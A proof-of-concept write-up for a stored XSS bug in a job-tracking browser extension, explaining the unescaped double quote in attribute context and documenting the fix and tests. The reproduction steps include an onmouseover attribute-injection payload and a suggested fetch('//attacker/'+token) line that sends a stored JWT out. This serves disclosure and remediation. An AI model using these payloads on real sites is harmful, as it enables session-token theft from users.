# PoC: JV-01, stored XSS via attribute-context escaping (CWE-79)

## The bug

`jobs.js` and `popup.js` each defined an `esc()` that built a text node and read
back its `innerHTML`:

```js
function esc(str) {
  const d = document.createElement('div');
  d.textContent = str;
  return d.innerHTML;   // escapes & < > but NOT "
}
```

HTML serialization of a **text node** escapes `&`, `<`, and `>`. It does not
escape the double quote, because a quote only needs escaping when a value is
serialized inside an attribute. So `esc()` was safe in text position and unsafe
inside an attribute. It was used in attribute position at, for example,
`jobs.js:245`:

```js
`<a href="${esc(job.url)}" title="${esc(job.title)}">...`
```

A `job.title` containing a `"` closes the `title` attribute early and injects a
new one. The taint is real: `content.js` scrapes `innerText` from arbitrary
third-party job pages, and `POST /jobs/import` accepts an attacker-supplied file.

## Reproduce (before the fix)

1. Check out the parent of the JV-01 fix commit.
2. Load the unpacked extension in Chrome (`chrome://extensions` -> Load unpacked).
3. Log in, then import `security/poc/xss-payload.json`. Its `title` is:
   `Senior Engineer" onmouseover="document.title='XSS:'+...`
4. Open the jobs page and hover the imported row.
5. The `onmouseover` fires: the browser tab title changes to `XSS:` followed by
   the localStorage keys. Swap the payload body for `fetch('//attacker/'+token)`
   to exfiltrate the stored JWT.

Screenshots: `../../../Resume/artifacts/appsec-portfolio/jobvault/xss-before.png`
and `xss-after.png`.

## The fix

`escape.js` provides `escHtml` (escapes all five significant characters,
including `"` and `'`, correct in text and attribute context) and `escUrl`
(rejects any scheme other than http(s)/mailto, closing `javascript:` in `href`).
Both `esc()` definitions now delegate to `JV.escHtml`; the `href` uses
`JV.escUrl`. The link also gains `rel="noopener noreferrer"`.

Unit tests in `test/escape.test.js` (`node --test test/escape.test.js`) pin that
the double quote is escaped and that `javascript:`/`data:` URLs are dropped.

## After the fix

Repeat the steps: the same import renders the payload as inert text inside the
title attribute. Hovering does nothing. The escaped value contains `&quot;`
where the raw `"` used to be, so the attribute cannot be closed early.
